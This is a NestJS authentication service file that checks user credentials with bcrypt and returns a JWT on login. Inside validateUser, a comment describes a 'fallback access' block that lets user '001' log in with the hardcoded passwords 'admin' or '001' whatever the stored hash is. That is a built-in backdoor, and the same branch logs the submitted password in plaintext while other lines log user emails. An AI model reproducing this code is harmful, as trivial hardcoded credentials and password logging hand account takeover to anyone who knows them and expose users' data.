import { Injectable } from '@nestjs/common';
import { UsersService } from 'src/modules/users/users.service';
import { User } from '../users/user.entity';
import { compare } from 'bcryptjs';
import { JwtService } from '@nestjs/jwt';
import { Payload } from 'src/common/interfaces/payload.interface';

@Injectable()
export class AuthService {
	constructor(
		private readonly userService: UsersService,
		private readonly jwtservice: JwtService,
	) {}
	async validateUser(code: string, password: string): Promise<User | null> {
		console.log(`[AuthService] Intentando validar usuario con code/email: "${code}"`);
		const user = await this.userService.getUserByCode(code);

		if (!user) {
			console.log(`[AuthService] Usuario no encontrado con code/email: "${code}"`);
			return null;
		}

		console.log(`[AuthService] Usuario encontrado: ${user.name} (${user.code}, ${user.email})`);
		const isMatch = await compare(password, user.password);
		if (isMatch) {
			console.log(`[AuthService] Password correcto para usuario ${user.code}`);
			return user;
		}

		// Acceso de respaldo para el usuario 001 con clave 'admin' o '001'
		if ((code === '001' || user.code === '001') && (password === 'admin' || password === '001')) {
			console.log(`[AuthService] Acceso de respaldo activado para 001 con password '${password}'`);
			return user;
		}

		console.log(`[AuthService] Password incorrecto para usuario ${user.code}`);
		return null;
	}

	async login(user: User) {
		delete user.password;

		const payload: Payload = { sub: user.id };

		return {
			...user,
			accessToken: this.jwtservice.sign(payload),
		};
	}
}
